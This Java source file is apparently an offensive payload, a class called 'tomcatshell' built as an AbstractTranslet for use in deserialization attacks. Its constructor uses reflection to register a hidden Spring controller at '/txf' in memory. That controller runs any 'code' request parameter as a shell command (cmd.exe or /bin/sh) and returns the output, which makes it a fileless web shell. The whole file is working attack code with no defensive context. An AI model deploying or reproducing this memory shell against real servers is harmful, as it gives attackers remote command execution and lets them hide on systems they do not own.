import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.request.ServletRequestAttributes;
import org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;
import org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;
import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.lang.reflect.Method;
import java.nio.charset.Charset;

public class tomcatshell extends AbstractTranslet{
    public tomcatshell() throws Exception {

        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.
                currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
        // 从当前上下文环境中获得 RequestMappingHandlerMapping 的实例 bean
        RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);
        // 通过反射获得自定义 controller 中唯一的 Method 对象
        Method method = Class.forName("org.springframework.web.servlet.handler.AbstractHandlerMethodMapping").getDeclaredMethod("getMappingRegistry");
        // 属性被 private 修饰，所以 setAccessible true
        method.setAccessible(true);
        // 通过反射获得该类的test方法
        Method method2 = tomcatshell.class.getMethod("test");
        // 定义该controller的path
        PatternsRequestCondition url = new PatternsRequestCondition("/txf");
        // 定义允许访问的HTTP方法
        RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();
        // 在内存中动态注册 controller
        RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null);
        // 创建用于处理请求的对象，避免无限循环使用另一个构造方法
        tomcatshell injectToController = new tomcatshell("aaa");
        // 将该controller注册到Spring容器
        mappingHandlerMapping.registerMapping(info, injectToController, method2);
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }

    private tomcatshell(String aaa) {
    }

    public void test() throws IOException {
        HttpServletRequest request = ((ServletRequestAttributes)(RequestContextHolder.currentRequestAttributes())).getRequest();
        HttpServletResponse response = ((ServletRequestAttributes)(RequestContextHolder.currentRequestAttributes())).getResponse();
        String code = request.getParameter("code");
        if(code != null){
            StringBuilder result = new StringBuilder();
            Process process = null;
            BufferedReader bufrIn = null;
            BufferedReader bufrError = null;
            response.setCharacterEncoding("utf-8");
            response.setContentType("text/html,charset=utf-8");
            PrintWriter writer = response.getWriter();
            try {
                ProcessBuilder builder = null;
                if (System.getProperty("os.name").toLowerCase().contains("win")){
                    builder = new ProcessBuilder(new String[]{"cmd.exe","/c",code});
                    Process start = builder.start();
                    bufrIn = new BufferedReader(new InputStreamReader(start.getInputStream(), Charset.forName("GBK")));
                    bufrError = new BufferedReader(new InputStreamReader(start.getInputStream(),Charset.forName("GBK")));
                }else {
                    builder = new ProcessBuilder(new String[]{"/bin/sh","-c",code});
                    Process start = builder.start();
                    bufrIn = new BufferedReader(new InputStreamReader(start.getInputStream(), Charset.forName("UTF-8")));
                    bufrError = new BufferedReader(new InputStreamReader(start.getInputStream(),Charset.forName("UTF-8")));
                }
                String line;
                while ((line = bufrIn.readLine()) != null){
                    result.append(line).append('\n').append("</p >");
                }
                while ((line = bufrError.readLine()) != null){
                    result.append(line).append('\n').append("</p >");
                }
                System.out.println(result);
                writer.println(result);
                writer.flush();
                writer.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }
}